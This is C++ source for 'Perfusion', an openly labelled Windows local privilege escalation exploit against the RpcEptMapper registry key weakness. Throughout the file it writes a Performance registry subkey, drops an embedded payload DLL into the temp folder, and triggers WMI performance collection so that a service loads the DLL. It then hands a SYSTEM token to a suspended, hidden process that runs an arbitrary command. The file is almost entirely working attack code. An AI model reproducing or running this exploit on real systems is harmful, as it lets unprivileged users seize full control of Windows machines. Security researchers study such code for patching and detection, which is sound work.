#include "resource.h"

#include <Windows.h>
#include <iostream>
#include <strsafe.h>
#include <sddl.h>
#include <Wbemidl.h>
#include <versionhelpers.h>

#pragma comment(lib, "wbemuuid.lib")

#define _WIN32_DCOM
#define VERSION L"0.1"
#define AUTHOR L"@itm4n"
#define TIMEOUT 60 // Global timeout value in seconds
#define PERFORMANCE_REGKEY L"SYSTEM\\CurrentControlSet\\Services\\RpcEptMapper\\Performance"

//
// Command line arguments parsing
//
BOOL ParseArguments(int argc, wchar_t* argv[]);
void PrintUsage();

//
// Exploit functions
//
BOOL Exploit();
BOOL CreateSuspendedProcess(LPPROCESS_INFORMATION lpProcessInformation);
BOOL WritePayloadDll(LPWSTR pwszDllPath);
BOOL SetPerformanceRegistryKey(LPCWSTR pwszDllPath, LPCWSTR pwszOpenName, LPCWSTR pwszCollectName, LPCWSTR pwszCloseName);
BOOL UnsetPerformanceRegistryKey();
DWORD PerformanceDataCollectionThread(LPVOID lpParam);
DWORD ControlThread(LPVOID lpParam);

//
// Misc helpers
//
BOOL CheckRequirements();
BOOL GenerateRandomUnicodeString(LPWSTR* ppwszRandomString);
BOOL GetCurrentSessionId(PDWORD pdwSessionId);
void GetWin32Perf();

//
// Global parameters, based on command line arguments parsing
//
LPWSTR g_pwszCommandLine = NULL;
BOOL g_bInteractive = FALSE;
BOOL g_bSpawnOnDesktop = FALSE;

int wmain(int argc, wchar_t* argv[])
{
    if (!ParseArguments(argc, argv))
        return 1;

    if (!CheckRequirements())
        return 2;

    Exploit();

    return 0;
}

BOOL ParseArguments(int argc, wchar_t* argv[])
{
    BOOL bReturnValue = TRUE;

    while ((argc > 1) && (argv[1][0] == '-'))
    {
        switch (argv[1][1])
        {
        case 'h':
            bReturnValue = FALSE;
            break;
        case 'i':
            g_bInteractive = TRUE;
            break;
        case 'd':
            g_bSpawnOnDesktop = TRUE;
            break;
        case 'c':
            ++argv;
            --argc;
            if (argc > 1 && argv[1][0] != '-')
            {
                g_pwszCommandLine = argv[1];
            }
            else
            {
                wprintf(L"[-] Missing value for option: -c\n");
                bReturnValue = FALSE;
            }
            break;
        default:
            wprintf(L"[!] Invalid option: %ls\n", argv[1]);
            bReturnValue = FALSE;
        }

        ++argv;
        --argc;
    }

    if (g_bSpawnOnDesktop)
        g_bInteractive = FALSE;

    if (!g_pwszCommandLine)
    {
        wprintf(L"[-] Missing command line argument: -c\n");
        bReturnValue = FALSE;
    }

    if (!bReturnValue)
        PrintUsage();

    return bReturnValue;
}

void PrintUsage()
{

    wprintf(
        L" _____         ___         _         \n"
        "|  _  |___ ___|  _|_ _ ___|_|___ ___ \n"
        "|   __| -_|  _|  _| | |_ -| | . |   |  version %ws\n"
        "|__|  |___|_| |_| |___|___|_|___|_|_|  by %ws\n"
        "\n"
        "Description:\n"
        "  Exploit tool for the RpcEptMapper registry key vulnerability.\n"
        "\n",
        VERSION,
        AUTHOR
    );

    wprintf(
        L"Options:\n"
        "  -c <CMD>  Command - Execute the specified command line\n"
        "  -i        Interactive - Interact with the process (default: non-interactive)\n"
        "  -d        Desktop - Spawn a new process on your desktop (default: hidden)\n"
        "  -h        Help - That's me :)\n"
        "\n"
    );
}

BOOL Exploit()
{
    BOOL bReturnValue = FALSE;

    LPWSTR pwszRandomString = NULL;
    LPWSTR pwszDllPath = NULL;
    WCHAR wszTempPath[MAX_PATH] = { 0 };

    BOOL bDllCreated = FALSE;
    BOOL bRegistryKeyCreated = FALSE;
    HANDLE hPerformanceTriggerThread = NULL;
    DWORD dwWait = 0;
    HANDLE hControlThread = NULL;
    DWORD dwControlThreadExitCode = 0;

    PROCESS_INFORMATION pi = { 0 };
    DWORD dwSessionId = 0;

    pwszDllPath = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    if (!pwszDllPath)
        goto cleanup;

    if (!GenerateRandomUnicodeString(&pwszRandomString))
        goto cleanup;

    if (MAX_PATH < GetTempPath(MAX_PATH, wszTempPath))
        goto cleanup;

    if (!GetCurrentSessionId(&dwSessionId))
        goto cleanup;

    //wprintf(L"[*] Current session ID: %d\n", dwSessionId);

    if (!CreateSuspendedProcess(&pi))
        goto cleanup;

    if (!pi.hProcess || !pi.hThread)
        goto cleanup;

    //wprintf(L"[*] Created a Process in suspended state - PID=%d - TID=%d\n", pi.dwProcessId, pi.dwThreadId);

    if (FAILED(StringCchPrintf(pwszDllPath, MAX_PATH, L"%wsperformance_%d_%d_%d.dll", wszTempPath, pi.dwProcessId, pi.dwThreadId, dwSessionId)))
        goto cleanup;

    //wprintf(L"[*] DLL path will be: %ws\n", pwszDllPath);

    if (!WritePayloadDll(pwszDllPath))
        goto cleanup;

    wprintf(L"[*] Created Performance DLL: %ws\n", pwszDllPath);
    bDllCreated = TRUE;

    if (!SetPerformanceRegistryKey(pwszDllPath, L"OpenPerfData", L"CollectPerfData", L"ClosePerfData"))
        goto cleanup;

    wprintf(L"[*] Created Performance registry key.\n");
    bRegistryKeyCreated = TRUE;

    hPerformanceTriggerThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PerformanceDataCollectionThread, NULL, 0, NULL);
    if (!hPerformanceTriggerThread)
        goto cleanup;

    wprintf(L"[*] Triggered Performance data collection.\n");

    if (!(hControlThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ControlThread, &pi, 0, NULL)))
        goto cleanup;

    //
    // The purpose of the control Thread is to synchronize with the Performance DLL thanks to a 
    // global Event. If the DLL is loaded and the OpenPerfData function is executed, a global
    // Event is indeed created and remains active for 3 seconds. This lets some time for the client
    // to know whether the DLL was loaded or not. 
    // The control Thread should always terminate without errors. The return value of the Thread 
    // must be examined in order to check whether the exploit was successfull or not, i.e. if we 
    // got a SYSTEM Token. If all goes well, the control Thread returns ERROR_SUCCESS.
    //
    dwWait = WaitForSingleObject(hControlThread, TIMEOUT * 1000);
    switch (dwWait)
    {
    case WAIT_OBJECT_0:
        if (GetExitCodeThread(hControlThread, &dwControlThreadExitCode))
        {
            bReturnValue = dwControlThreadExitCode == ERROR_SUCCESS;
            bReturnValue ? wprintf(L"[+] Exploit completed. Got a SYSTEM token! :)\n") : wprintf(L"[-] Exploit completed but no SYSTEM Token. :/\n");
        }
        break;
    case WAIT_TIMEOUT:
        wprintf(L"[-] Control Thread timeout.\n");
        break;
    default:
        wprintf(L"[-] WaitForSingleObject() error: %d\n", GetLastError());
    }

    //
    // Before continuing, we should ensure that the trigger Thread has terminated, regardless of 
    // the control Thread's exit code.
    //
    wprintf(L"[*] Waiting for the Trigger Thread to terminate... ");
    dwWait = WaitForSingleObject(hPerformanceTriggerThread, TIMEOUT * 1000);
    switch (dwWait)
    {
    case WAIT_OBJECT_0:
        wprintf(L"OK\n");
        break;
    case WAIT_TIMEOUT:
        wprintf(L"Timeout!\n");
        break;
    default:
        wprintf(L"Error: %d\n", GetLastError());
    }

    //
    // Do some cleanup before continuing.
    //
    (bRegistryKeyCreated = !UnsetPerformanceRegistryKey()) ? wprintf(L"[-] Failed to delete Performance registry key.\n") : wprintf(L"[*] Deleted Performance registry key.\n");
    (bDllCreated = !DeleteFile(pwszDllPath)) ? wprintf(L"[-] Failed to delete Performance DLL.\n") : wprintf(L"[*] Deleted Performance DLL.\n");

    //
    // If the exploit was successfull, we can resume our subprocess' main Thread and interact with
    // it if that's what the user wants.
    //
    if (bReturnValue)
    {
        //
        // ResumeThread returns the previous Thread's Suspend count. Here it is '1' because we
        // created the process and we suspended it only once. So, just make sure that it's 
        // what ResumeThread returns, otherwise it means that it failed.
        //
        if (ResumeThread(pi.hThread) != 1)
        {
            wprintf(L"[-] ResumeThread() with error code %d\n", GetLastError());
            bReturnValue = FALSE;
            goto cleanup;
        }

        if (g_bInteractive)
            WaitForSingleObject(pi.hProcess, INFINITE);
    }

cleanup:
    if (hControlThread)
        CloseHandle(hControlThread);
    if (hPerformanceTriggerThread)
        CloseHandle(hPerformanceTriggerThread);
    if (!bReturnValue && pi.hProcess)
        TerminateProcess(pi.hProcess, 0); // If the exploit failed, kill the created process.
    if (bRegistryKeyCreated)
        UnsetPerformanceRegistryKey();
    if (bDllCreated)
        DeleteFile(pwszDllPath);
    if (pwszRandomString)
        LocalFree(pwszRandomString);
    if (pwszDllPath)
        LocalFree(pwszDllPath);

    return bReturnValue;
}

BOOL CreateSuspendedProcess(LPPROCESS_INFORMATION lpProcessInformation)
{
    DWORD dwCreationFlags = 0;
    STARTUPINFO si = { 0 };

    SECURITY_DESCRIPTOR sd = { 0 };
    SECURITY_ATTRIBUTES sa = { 0 };

    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);

    sa.nLength = sizeof(sa);
    sa.bInheritHandle = FALSE;
    sa.lpSecurityDescriptor = &sd;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);

    if (!g_bInteractive && !g_bSpawnOnDesktop)
    {
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
    }

    if (g_bSpawnOnDesktop || !g_bInteractive)
    {
        dwCreationFlags |= CREATE_NEW_CONSOLE;
    }

    dwCreationFlags |= CREATE_SUSPENDED;

    return CreateProcess(NULL, g_pwszCommandLine, &sa, &sa, FALSE, dwCreationFlags, NULL, NULL, &si, lpProcessInformation);
}

BOOL WritePayloadDll(LPWSTR pwszDllPath)
{
    //
    // In "development" mode:
    //     1. Assume PerfusionDll.dll is in the current working working directory
    //     2. Copy it to the target path
    // In "release" mode:
    //     1. Embed the compiled DLL (x64) as a resource
    //     2. Fetch that resource at runtime
    //     3. Create a new file at the target path
    //     4. Copy the resource's content to the file
    //

    //CopyFile(L"PerfusionDll.dll", pwszDllPath, FALSE);

    HRSRC hResource = NULL;
    HGLOBAL hResourceData = NULL;
    DWORD dwResourceSize = 0;
    LPVOID lpData = NULL;

    HANDLE hFile = NULL;
    DWORD dwBytesWritten = 0;

    SetLastError(ERROR_SUCCESS);

    if (!(hResource = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA)))
        goto cleanup;

    if (!(dwResourceSize = SizeofResource(NULL, hResource)))
        goto cleanup;
    
    if (!(hResourceData = LoadResource(NULL, hResource)))
        goto cleanup;

    if (!(lpData = LockResource(hResourceData)))
        goto cleanup;

    if (INVALID_HANDLE_VALUE == (hFile = CreateFile(pwszDllPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)))
        goto cleanup;
    
    if (!WriteFile(hFile, lpData, dwResourceSize, &dwBytesWritten, NULL))
        goto cleanup;

cleanup:
    if (hFile)
        CloseHandle(hFile);
    if (GetLastError() != ERROR_SUCCESS)
        wprintf(L"[-] Something went wrong. Last error code was %d\n", GetLastError());

    return TRUE;
}

BOOL GenerateRandomUnicodeString(LPWSTR* ppwszRandomString)
{
    GUID guid = { 0 };

    if (!ppwszRandomString)
        return FALSE;

    if (CoCreateGuid(&guid) != S_OK)
        return FALSE;

    *ppwszRandomString = (LPWSTR)LocalAlloc(LPTR, 16 * sizeof(WCHAR));
    if (!*ppwszRandomString)
        return FALSE;

    StringCchPrintf(*ppwszRandomString, 16, L"%08X", guid.Data1);

    return TRUE;
}

BOOL SetPerformanceRegistryKey(LPCWSTR pwszDllPath, LPCWSTR pwszOpenName, LPCWSTR pwszCollectName, LPCWSTR pwszCloseName)
{
    BOOL bReturnValue = FALSE;
    HKEY hPerformanceKey = NULL;
    DWORD dwDisposition = 0;
    LSTATUS status = 0;

    if (ERROR_SUCCESS == (status = RegCreateKeyEx(HKEY_LOCAL_MACHINE, PERFORMANCE_REGKEY, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_WOW64_64KEY, NULL, &hPerformanceKey, &dwDisposition)))
    {
        if (REG_CREATED_NEW_KEY == dwDisposition)
        {
            RegSetValueEx(hPerformanceKey, L"Library", 0, REG_SZ, (BYTE*)pwszDllPath, (DWORD)((wcslen(pwszDllPath) + 1) * sizeof(WCHAR)));
            RegSetValueEx(hPerformanceKey, L"Open", 0, REG_SZ, (BYTE*)pwszOpenName, (DWORD)((wcslen(pwszOpenName) + 1) * sizeof(WCHAR)));
            RegSetValueEx(hPerformanceKey, L"Collect", 0, REG_SZ, (BYTE*)pwszCollectName, (DWORD)((wcslen(pwszCollectName) + 1) * sizeof(WCHAR)));
            RegSetValueEx(hPerformanceKey, L"Close", 0, REG_SZ, (BYTE*)pwszCloseName, (DWORD)((wcslen(pwszCloseName) + 1) * sizeof(WCHAR)));
            bReturnValue = TRUE;
        }
        else
            wprintf(L"Performance key already exists\n");

        RegCloseKey(hPerformanceKey);
    }
    else
        wprintf(L"[-] RegCreateKeyEx() failed with error code %d.\n", status);

    return bReturnValue;
}

BOOL UnsetPerformanceRegistryKey()
{
    return ERROR_SUCCESS == RegDeleteKey(HKEY_LOCAL_MACHINE, PERFORMANCE_REGKEY);
}

DWORD PerformanceDataCollectionThread(LPVOID lpParam)
{
    GetWin32Perf();
    return 0;
}

BOOL GetCurrentSessionId(PDWORD pdwSessionId)
{
    BOOL bReturnValue = FALSE;
    HANDLE hCurrentToken = NULL;
    DWORD dwSessionId = 0;
    DWORD dwReturnLen = 0;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hCurrentToken))
        goto cleanup;

    if (!GetTokenInformation(hCurrentToken, TokenSessionId, &dwSessionId, sizeof(dwSessionId), &dwReturnLen))
        goto cleanup;

    *pdwSessionId = dwSessionId;
    bReturnValue = TRUE;

cleanup:

    if (hCurrentToken)
        CloseHandle(hCurrentToken);

    return bReturnValue;
}

DWORD ControlThread(LPVOID lpParam)
{
    DWORD dwReturnValue = 1;
    LPPROCESS_INFORMATION lpi = (LPPROCESS_INFORMATION)lpParam;

    LPWSTR pwszEventName = NULL;
    HANDLE hEvent = NULL;
    DWORD dwSyncAttempts = 0;

    HANDLE hToken = NULL;
    PTOKEN_USER pTokenUser = NULL;
    DWORD dwSize = 0;
    LPWSTR pwszSid = NULL;

    pwszEventName = (LPWSTR)LocalAlloc(LPTR, 64 * sizeof(WCHAR));
    if (!pwszEventName)
        goto end;

    StringCchPrintf(pwszEventName, 64, L"Global\\Event_%d_%d", lpi->dwProcessId, lpi->dwThreadId);

    while (TRUE)
    {
        if (dwSyncAttempts >= TIMEOUT - 5)
            break;

        if (hEvent = OpenEvent(SYNCHRONIZE, FALSE, pwszEventName))
        {
            if (!OpenProcessToken(lpi->hProcess, TOKEN_QUERY, &hToken))
                break;

            GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
            if (ERROR_INSUFFICIENT_BUFFER != GetLastError())
                goto cleanup;

            if (!(pTokenUser = (PTOKEN_USER)LocalAlloc(LPTR, dwSize)))
                goto cleanup;

            if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize))
                goto cleanup;

            if (!ConvertSidToStringSid(pTokenUser->User.Sid, &pwszSid))
                goto cleanup;

            //wprintf(L"SID: %ws\n", pwszSid);

            if (_wcsicmp(pwszSid, L"S-1-5-18") == 0)
                dwReturnValue = ERROR_SUCCESS;

        cleanup:
            if (pwszSid)
                LocalFree(pwszSid);
            if (pTokenUser)
                LocalFree(pTokenUser);
            if (hToken)
                CloseHandle(hToken);

            break;
        }

        dwSyncAttempts++;
        Sleep(1000);
    }

end:
    if (pwszEventName)
        LocalFree(pwszEventName);

    return dwReturnValue;
}

void GetWin32Perf()
{
    HRESULT hr = S_OK;

    IWbemLocator* pWbemLocator = NULL;
    IWbemServices* pNameSpace = NULL;
    IWbemRefresher* pRefresher = NULL;
    IWbemConfigureRefresher* pConfig = NULL;
    IWbemHiPerfEnum* pEnum = NULL;
    IWbemObjectAccess** apEnumAccess = NULL;

    BSTR bstrNameSpace = NULL;
    long lID = 0;

    int i = 0;
    DWORD dwNumReturned = 0;
    DWORD dwNumObjects = 0;

    if (FAILED(hr = CoInitializeEx(NULL, COINIT_MULTITHREADED)))
        goto cleanup;

    if (FAILED(hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_NONE, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, 0)))
        goto cleanup;

    if (FAILED(hr = CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (void**)&pWbemLocator)))
        goto cleanup;

    bstrNameSpace = SysAllocString(L"\\\\.\\root\\cimv2");
    if (NULL == bstrNameSpace)
    {
        hr = E_OUTOFMEMORY;
        goto cleanup;
    }

    if (FAILED(hr = pWbemLocator->ConnectServer(bstrNameSpace, NULL, NULL, NULL, 0L, NULL, NULL, &pNameSpace)))
        goto cleanup;

    if (FAILED(hr = CoCreateInstance(CLSID_WbemRefresher, NULL, CLSCTX_INPROC_SERVER, IID_IWbemRefresher, (void**)&pRefresher)))
        goto cleanup;

    if (FAILED(hr = pRefresher->QueryInterface(IID_IWbemConfigureRefresher, (void**)&pConfig)))
        goto cleanup;

    if (FAILED(hr = pConfig->AddEnum(pNameSpace, L"Win32_Perf", 0, NULL, &pEnum, &lID)))
        goto cleanup;

    if (FAILED(hr = pRefresher->Refresh(0L)))
        goto cleanup;

    for (i = 0; i < 1; i++)
    {
        dwNumReturned = 0;
        dwNumObjects = 0;

        hr = pEnum->GetObjects(0L, dwNumObjects, apEnumAccess, &dwNumReturned);
        //wprintf(L"Number of objects: %d\n", dwNumReturned);

        if (NULL != apEnumAccess)
        {
            delete[] apEnumAccess;
            apEnumAccess = NULL;
        }

        // If no objects were returned, stop
        if (!dwNumObjects)
            break;
    }

cleanup:
    if (pEnum)
        pEnum->Release();
    if (pConfig)
        pConfig->Release();
    if (pRefresher)
        pRefresher->Release();
    if (pNameSpace)
        pNameSpace->Release();
    if (bstrNameSpace)
        SysFreeString(bstrNameSpace);
    if (pWbemLocator)
        pWbemLocator->Release();

    // 0x800706be - DLL loaded as LOCAL SERVICE on Windows Server 2012
    // 0x8004103c - DLL loaded as LOCAL SERVICE on Windows Server 2008 R2
    // 0x00000000 - 0 objects returned
    //wprintf(L"HREASULT: %d / 0x%08x\n", hr, hr);

    CoUninitialize();
}

BOOL CheckRequirements()
{
    SYSTEM_INFO sysinfo = { 0 };

    GetNativeSystemInfo(&sysinfo);

    if (PROCESSOR_ARCHITECTURE_AMD64 == sysinfo.wProcessorArchitecture)
        return TRUE;
    else
        wprintf(L"[-] This system architecture is not supported.\n");

    return FALSE;
}
